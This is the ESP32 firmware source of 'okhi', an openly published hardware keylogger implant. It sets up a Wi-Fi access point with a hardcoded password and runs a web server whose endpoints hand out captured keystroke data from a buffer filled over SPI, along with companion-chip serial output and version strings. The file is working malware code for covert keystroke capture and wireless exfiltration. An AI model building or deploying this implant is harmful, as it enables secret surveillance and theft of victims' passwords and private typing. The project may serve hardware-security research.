/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg 
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

#include <Arduino.h>

#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_log.h"
#include "driver/spi_slave.h"
#include "driver/gpio.h"

#include <WiFi.h>
#include <WebServer.h>
#include <SPI.h>
#include "okhi.h"

#include "../../../../last_firmv.h"


//#define AS_WIFI_CLIENT 1 // ONLY FOR DEVELOPMENT
#ifdef AS_WIFI_CLIENT
#warning "AS_WIFI_CLIENT defined"
#endif

char HwVer[256];

bool hwver_init = false;


const char* ssid = "ESP";
const char* password = "0123456789";

WebServer server(80);

void handleRoot() 
{
  #include "webuff.txt"

  server.send_P(200, (PGM_P) "text/html", web);
}

void handleESPBuffer() {
  static unsigned int last_sended_i = 0;

  if (buffer_esp[0] != 0)
  {
    server.send(200, "text/plain", (char*) buffer_esp);
  }
  else
  {
    server.send(204, "text/plain", "NO DATA");
  }
}

void handleRPBuffer() {
  static unsigned int last_sended_i = 0;

  if (buffer_rp2040[0] != 0)
  {
    server.send(200, "text/plain", (char*) buffer_rp2040);
  }
  else
  {
    server.send(204, "text/plain", "NO DATA");
  }
}


void handleVerBuffer() {
  server.send(200, "text/plain", (char*) FIRMV_STR);
}

void handleHwVerBuffer() {
  if (!hwver_init)
  {
      char* hwver = strstr((char*)buffer_rp2040, "HWv");
      if (hwver != NULL)
      {
          hwver_init = true;
          strcpy(HwVer, hwver + 2);
          hwver = strstr(HwVer, " ");
          if (hwver != NULL)
          {
            *hwver = '\0';
          }
      }
  }

  if (hwver_init)
  {
    server.send(200, "text/plain", HwVer);
  }
}


void handleBuffer() {
  static unsigned int last_sended_i = 0;

  unsigned int target_index = write_index;
  if (last_sended_i != target_index)
  {
    static unsigned char auxbuff[sizeof(ringbuff) + 1];
    memset(auxbuff, 0, sizeof(auxbuff));

    while (last_sended_i != target_index)
    {
      strcat((char*)auxbuff, (char*) &(ringbuff[last_sended_i++ % (RING_BUFF_MAX_ENTRIES - 1)][LINE_SIZE]));
    }
    server.send(200, "text/plain", (char*) auxbuff);
  }
  else
  {
    server.send(204, NULL, NULL);
  }
}

void onReceiveFunction(void) {
  static unsigned int rpi;
  size_t available = Serial.available();
  while (available--) 
  {
    unsigned char recv = Serial.read();
    if (recv != '\0')
    {
      buffer_rp2040[rpi++ % (sizeof(buffer_rp2040) - 1)] = recv >= 0x20 && recv <= 0x7E ? recv : '?' ;
    }
    else
    {
      rpi = 0;
    }
  }
}

void disable_serial(void)
{
  Serial.end();
  Serial.flush();
  Serial.setRxFIFOFull(0);
  Serial.onReceive(NULL);
}

void enable_serial(void)
{
  Serial.begin(74880, SERIAL_8N1);
  Serial.flush();
  Serial.setRxFIFOFull(32); 
  Serial.onReceive(onReceiveFunction, false); 
}

void setup() 
{
  hwver_init = false;
  memset(HwVer, 0, sizeof(HwVer));
  strcpy((char*) buffer_rp2040, "RP ALL OK");
  strcpy((char*) buffer_esp, "ESP ALL OK");
  enable_serial();
  delay(500);
  Serial.println("ESP init!");

  xTaskCreate(spi_task, "spi_task", 4096, NULL, configMAX_PRIORITIES - 1, NULL);

  #ifdef AS_WIFI_CLIENT
  #include "wifi_client.h"
  /*
    #define CLIENT_SSID "SSID"
    #define CLIENT_PASSWORD "PASSWD"
  */
  WiFi.begin(CLIENT_SSID, CLIENT_PASSWORD); 
  Serial.print("Conecting to ");
  Serial.print(CLIENT_SSID);
  Serial.print(" ");
  Serial.println(CLIENT_PASSWORD);

  int i = 0;
  while (WiFi.status() != WL_CONNECTED) { // Wait for the Wi-Fi to connect
    delay(1000);
    Serial.print(++i); 
    Serial.print(' ');
  }
  Serial.println("\r\nConnected to the WiFi network");

  IPAddress IP = WiFi.localIP();
  #else
  WiFi.softAP(ssid, password, 1, false, 1);
  IPAddress IP = WiFi.softAPIP();
  #endif

  Serial.print("IP: ");
  Serial.println(IP);

  server.on("/", handleRoot);
  server.on("/buffer", handleBuffer);
  server.on("/esp", handleESPBuffer);
  server.on("/rp", handleRPBuffer);
  server.on("/ver", handleVerBuffer);
  server.on("/hwver", handleHwVerBuffer);
  server.begin();
  Serial.println("HTTP SERVER STARTED");  
}

void loop() 
{
  server.handleClient(); 
}
